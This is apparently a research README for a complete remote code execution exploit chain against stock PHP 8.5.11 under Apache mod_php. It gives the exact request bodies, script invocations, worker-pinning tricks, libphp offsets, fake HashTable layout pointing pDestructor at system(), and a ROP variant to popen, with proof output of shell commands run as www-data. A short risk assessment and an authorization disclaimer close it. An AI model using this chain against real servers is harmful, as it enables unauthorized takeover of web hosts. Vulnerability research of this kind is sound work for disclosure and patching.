# php2shell display-errors-off chain (stock PHP 8.5.11, mod_php, 128M)

Working end-to-end reproduction of the php2shell `session.upload_progress` OOM
use-after-free on stock PHP 8.5.11 mod_php. The target uses the byte-identical
`php.ini-production`:

- `display_errors=Off`, `display_startup_errors=Off`
- `memory_limit=128M`, `post_max_size=8M`, `max_input_vars=1000`
- `output_buffering=4096`, session upload-progress defaults on

No PHP setting is changed to make the chain work. The target page can be an
empty PHP file.

This chain requires `session.upload_progress.enabled=On`, the stock default. The
multipart callback returns immediately when it is off (`ext/session/session.c:3186`),
so the first stage has no session initializer. A target with it explicitly disabled is
outside this reproduction. The advisory's separate parser/hash-table path and the
non-default `session.auto_start` trigger are different mechanisms, not implemented here.

Verified 3/3 on fresh workers with that stock ini. Proof (`/tmp` is
www-data-writable; `/out` in the lab is not):

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
Sun Oct 25 16:58:00 UTC 2026
```

The exploit path is pure HTTP. No target-side files, no gdb, no app code.

A single persistent worker carries the four requests because they share dangling
session globals, and the bailout stages answer `HTTP/1.0 500` with
`Connection: close`, so keep-alive alone cannot carry the state across them.
This is SAPI bailout handling, not just an unread body: a script `E_USER_ERROR`
or OOM after a fully read body also closes the connection, and a pipelined
request behind the fatal is discarded (verified with a persistent relay too:
A1 closes, B1 lands on another child). On a
stock prefork target the attacker pins a child by holding `MaxRequestWorkers-1`
partial chunked POSTs; that is attacker-side, not a target config change.
Validated on 10 children with 9 pins and stock KeepAlive
(`MaxKeepAliveRequests 100`, `KeepAliveTimeout 5`), stock php.ini-production:

```
CONTAINER=p2s-10ka PINS=9 ./off_chain/run_off_chain_pinned.sh 8093 /tmp/off_proof
RCE OK
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Files

| File | Role |
|---|---|
| `mk_a1_off.py` | A1 multipart body generator (OOM + stale `PS(id)` at page 0x137) |
| `chunked_send.py` | sends a body with `Transfer-Encoding: chunked` (bypasses `post_max_size`) |
| `off_b1b.php` | B1 body generator: 200x231B fields, `nf` 511-page fills, partial forge at the id page, X arrays; saves the response to `/tmp/off_leak.resp` |
| `parse_leak.php` | turns the 819200-byte Set-Cookie into `main` and `libphp` bases |
| `cheap_oom_a.py` | A2 cheap-OOM body (dangling `PS(http_session_vars)` reference) |
| `stage3_off.php` | A2+B2 sender: fake reference spray + fake zend_array, `pDestructor=zif_system` |
| `stage3_rop.php` | B2 variant: `pDestructor` = libphp pivot gadget, ROP to `popen@plt` |
| `run_off_chain.sh` | one-command orchestrator |
| `pin_workers.py` | holds `MaxRequestWorkers-1` children with partial chunked POSTs |
| `run_off_chain_pinned.sh` | pinned multi-child runner (10 children: `PINS=9`) |
| `keepalive_relay.py` | research: one persistent backend connection, `close`->`xlose` rewrite, static keep-alive pings |
| `../progress.md` | full research log (all failed paths, heap measurements) |

## Usage

1. Target: stock PHP 8.5.11 mod_php with `php.ini-production`.
2. Start one persistent worker. In this lab the mounted php.ini is the stock
   production file (`lab/php-off.ini` is a byte-identical copy):

   ```bash
   docker exec -d p2s-8511-off apache2 -f /tmp/httpd.conf -X
   ```

   On stock prefork, pin one child instead.
3. Run the chain:

   ```bash
   CONTAINER=p2s-8511-off ./off_chain/run_off_chain.sh 8091 /tmp/off_proof
   ```

4. Multi-child prefork (validated with 10 children and stock KeepAlive):

   ```bash
   docker run -d --name p2s-10ka --entrypoint /usr/sbin/apache2 \
     -p 127.0.0.1:8093:8091 \
     -v "$PWD/www:/var/www/html:ro" \
     -v "$PWD/lab/php-off.ini:/usr/local/etc/php/php.ini:ro" \
     -v "$PWD/lab/httpd-10ka.conf:/tmp/httpd-10ka.conf:ro" \
     php:8.5.11-apache -f /tmp/httpd-10ka.conf -DFOREGROUND
   CONTAINER=p2s-10ka PINS=9 ./off_chain/run_off_chain_pinned.sh 8093 /tmp/off_proof
   ```

   The config keeps the stock KeepAlive values; the chains' bailout responses
   close their connections, so the pins provide affinity across them.

The runner performs A1 -> B1 (leak, parse bases) -> A2 -> B2 and checks the proof.
It clears `/tmp/off_leak.resp` and checks the B1 request before parsing, and removes
the target-side `$PROOF` before B2 when `CONTAINER` is set, so a stale file cannot
mask a failed run. `$PROOF` is a path **inside the target** and must be writable by
the web user.
With `CONTAINER=<name>` the proof is read via `docker exec` (as in this lab);
without it the path is checked on the local filesystem (for a local target).
The gdb probes in `/tmp` are for calibration only; the chain does not use them.
The B2 response is empty and the worker may crash after `system()`; the proof file
is the success criterion.

## Chain

### A1: persistent `send_cookie=1` + dangling `PS(id)` at page 0x137

Body: `mk_a1_off.py --progress-early --progress-len=4044 --post40=1 --big=78
--burners=19 --cttail=4000 --sid-late`, sent with `Transfer-Encoding: chunked`.
URL: `?q0000000..4=v&g0..g7=<15-byte value>`.

Why it works:
- `--progress-early` (progress before the big fields) makes the END-cleanup
  `php_session_initialize()` run with the heap exhausted; the created id's bin-64
  page lands mid-chunk at page **0x137**.
- `--post40` + the 8 GET 15-byte values drain bin 40; `--cttail=4000` (trailing file
  part with a 4000-byte content-type) consumes the last live page; `--sid-late`
  keeps the session init at the END (a PHPSESSID after the file part).
- Observed at `php_session_reset_id`: `send_cookie=1, bin128=0, free_pages=0,
  id page 0x137`, md in the main chunk; `php_url_encode` OOMs. The bailout skips
  the request-startup module RSHUTDOWN (POST is parsed in `php_hash_environment`
  before `zend_activate_modules()`), so the session globals persist into the next
  request.

### B1: forged zend_string OOB read, main + libphp recovery

`off_b1b.php <port> 14 0x137 0xC8000 0x1018 300 0 400 0`

- 14x 511-page plain fills, then a **400-page** partial forge whose fake
  `zend_string` header sits at page 0x137 (Best-Fit lands it in the id chunk;
  311-page variations miss, 511-page floods land on the page instead).
- 300 nested array fields fill the freed pages 0x138..0x1ff; the forged id is
  url-encoded and returned in `Set-Cookie` (819200 bytes).
- Parse (`parse_leak.php`): bucket qwords by `q & ~0x1FFFFF`; the most frequent
  qword ending in `0x7a0` is `zval_ptr_dtor`, `libphp = qword - 0x7b47a0`.
  Skip the largest bucket (the id chunk) and the libphp bucket; the next bucket
  with count >= 50 and `|b - libphp| < 0x4000000` is the main chunk.

### A2: dangling session reference

`cheap_oom_a.py --port <port> --parts 880 --depth 64 --fillers 115`

Nested empty file fields OOM after `php_session_track_init()` created
`PS(http_session_vars)` (a `zend_reference` at `ps_globals+0x168`). The OOM
bailout leaves the reference dangling. On this build the reference sits at
**hsv = main + 0x7c720** (stable across runs; measured with a `PS(http_session_vars)`
probe).

### B2: fake reference + fake HashTable

`stage3_off.php <port> <main> <libphp> '{ id; date; }>/tmp/proof'`

- `pDestructor = zif_system = libphp + 0x5996e0`.
- Fake HashTable at `S = hsv + 0x7AC78 = main + 0xF7398`.
- Body: 500 384-byte values whose data holds a fake `zend_reference`
  (rc=1, type 0x0A, ptr=S, val.type=0x107), then the `ht` payload (fake
  zend_array + fake execute_data + command string), then PHPSESSID/progress,
  then 495 values with ptr=0.
- The first spray lands exactly on the A2's reference (verified in gdb: the
  contents at hsv become the fake reference). The B2 `track_init` destroys it ->
  destroys the fake array at S -> `zif_system(cmd)`.

### B2 variant: pivot + popen ROP

`stage3_rop.php` replaces the `zif_system` execute_data frame with libphp
gadgets: `pDestructor = lib + 0x64904E` (`mov %rdi,%rsp`; the gadget restores
MXCSR/x87 and callee-saved registers from the bucket, sets
`rsp = bucket + 0x48`, and jumps to `bucket + 0x40`), and the bucket value is a
ROP stack: `pop rdi;ret` (`lib + 0x197128`) -> command, `pop rsi;ret`
(`lib + 0x195A89`) -> `"r"`, `ret` (`lib + 0x183016`), `popen@plt`
(`lib + 0x18BBC0`). The bucket+0x10 qword overlaps `HT->pDestructor` and must
hold the pivot (the gadget loads it into r12).

Verified on 10 pinned children:

```
STAGE3=stage3_rop.php CONTAINER=p2s-10ka PINS=9 ./off_chain/run_off_chain_pinned.sh 8093 /tmp/rop_proof
B2-ROP S=0x7a63adaf7398 pivot=0x7a63aaa4904e popen=0x7a63aa58bbc0
RCE OK
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

It removes the forged `execute_data`, the `func`/`num_args`/arg0-type and
NUL-string constraints, and the `return_value` write; only the ROP stack and
the leaked bases are needed.

## Offsets (this build)

```
zval_ptr_dtor = libphp + 0x7b47a0
zif_system    = libphp + 0x5996e0
hsv           = main  + 0x7c720
S             = hsv   + 0x7AC78  (= main + 0xF7398)
```

The `S - hsv = 0x7AC78` relation is invariant across the 8.4.26 reference and this
8.5.11 build; `hsv` itself is request/heap dependent. If a different A1/B1 heap
changes the A2's hsv (the reference resets showed +0x2000 shifts), adjust the S
offset by the same delta (the On-chain's `S=main+0xF5398` misses here by exactly
+0x2000).

## Evidence

- A1: HTTP 500, `send_cookie=1`, `bin128=0`, `free_pages=0`, id page 0x137,
  OOM at `php_url_encode`; worker alive.
- B1: HTTP 200, 819200-byte Set-Cookie, 33 2MB buckets; id chunk x6346,
  libphp cluster x949, main x707 (main matched gdb's `mod & ~0x1FFFFF`).
- A2: HTTP 500 cheap OOM; `hsv` = main+0x7c720 (IS_REFERENCE, type 0x30a).
- B2: fake reference at hsv confirmed by gdb; proof file written;
  B2 response empty / worker crashes afterwards (expected).
- Reproducibility: 3/3 on the stock php.ini-production, fresh workers, different ASLR bases.

## Risk assessment

php2shell is real and exploitable on mod_php 8.5.11 under the stock production
posture with a single persistent worker: ASLR is bypassed by a forged-zend_string
out-of-bounds read (libphp and the main chunk base), and a fake HashTable
`pDestructor` reaches `system()` as the web user.

The decisive difference is the SAPI's failed-startup path. PHP-FPM treats
`php_request_startup() == FAILURE` as fatal: `sapi/fpm/fpm/fpm_main.c:1838-1843`
calls `php_module_shutdown()` and returns `FPM_EXIT_SOFTWARE`, so the worker exits
and the master replaces it; the dangling globals die with the process. Apache's
mod_php handler only `zend_bailout()`s the failed request
(`sapi/apache2handler/sapi_apache2.c:672-674`) and the child keeps serving, which
is what carries the stale session state. Primary mitigation: the fixed releases
(8.5.12 / 8.4.27 / 8.3.36 / 8.2.35).

Lab research only: run against systems you own or are authorized to test.
